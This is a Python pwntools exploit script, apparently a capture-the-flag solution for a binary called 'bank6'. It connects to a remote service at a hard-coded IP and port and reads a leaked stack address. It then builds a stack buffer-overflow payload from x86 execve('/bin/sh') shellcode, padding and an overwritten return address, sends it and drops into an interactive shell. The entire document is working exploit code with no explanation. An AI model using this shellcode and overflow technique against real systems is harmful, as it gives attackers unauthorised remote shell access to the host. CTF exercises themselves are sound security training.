from pwn import *

binary = context.binary = ELF('./bank6')

#p = process('./bank6')
p = remote('61.28.237.24', '30207')

p.recvuntil('Here is a gift: ')

shelladdr = int(p.recvline().strip(), 16)

#shellcode = asm(shellcraft.execve("/bin/sh", 0, 0))
#shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"

shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x08\x40\x40\x40\xcd\x80"
#shellcode = asm(shellcraft.sh())
print("shell:", shellcode)

print("len shellcode: ", len(shellcode))
print(str(shellcode))

dis = (((shelladdr + 1036) >> 8) << 8) - shelladdr
print("distance: ",dis)
payload = shellcode
payload += b'A'*(dis+4-len(payload))
payload += p32(shelladdr)
payload += b'A'*(0x40c-len(payload))





f = open('solve.txt', 'wb')
print(p32(shelladdr))
print(p32(0xffffce0c))
print("payload len: ", len(payload))
f.write(payload)
p.sendline(payload)
print(payload)

p.interactive()
